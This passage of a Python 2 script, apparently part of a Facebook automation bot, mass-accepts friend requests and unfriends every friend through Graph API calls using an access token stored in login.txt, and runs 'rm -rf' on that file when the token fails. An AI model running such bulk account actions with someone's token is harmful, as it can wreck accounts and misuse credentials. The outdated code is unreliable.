		print"[!] Token Not Found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print banner
	limit = raw_input("\033[1;97m[+] \033[1;97mLimit \033[1;97m:\033[1;97m ")
	r = requests.get('https://graph.facebook.com/me/friendrequests?limit='+limit+'&access_token='+toket)
	teman = json.loads(r.text)
	if '[]' in str(teman['data']):
		print"No friend Request"
		raw_input("\n\033[1;97m[ \033[1;97mBack \033[1;97m]")
		menu_bot()
	hamza('\033[1;97m[✔] \033[1;97mThe Process Has Been Start \033[1;97m...')
	print 42*"\033[1;97m═"
	for i in teman['data']:
		gas = requests.post('https://graph.facebook.com/me/friends/'+i['from']['id']+'?access_token='+toket)
		a = json.loads(gas.text)
		if 'error' in str(a):
			print "\033[1;97m[ \033[1;91mFailed\033[1;97m ] "+i['from']['name']
		else:
			print "\033[1;97m[✔] \033[1;97m[Accepted]\033[1;97m ] "+i['from']['name']
	print "----------------------------------"
	print"[✔] The Process Has Been Completed."
	raw_input("[Back] ")
	menu_bot()
	
##### UNFRIEND ####
def unfriend():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"[!] Token Not Found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print banner
	hamza('[✔] The Process Has Been Started.')
	print "[✔] Press CTRL Z to Stop Process."
	print "----------------------------------"
	try:
		pek = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
		cok = json.loads(pek.text)
		for i in cok['data']:
			nama = i['name']
			id = i['id']
			requests.delete("https://graph.facebook.com/me/friends?uid="+id+"&access_token="+toket)
			print "[✔] [Unfriended] "+nama
	except IndexError: pass
	except KeyboardInterrupt:
		print "[!]The Process Has Been Stopped"
		raw_input("[Back] ")
		menu_bot()
	print"[✔] The Process Has Been Completed."
	raw_input("[Back] ")
	menu_bot()
	
if __name__ == '__main__':
	tlogin()
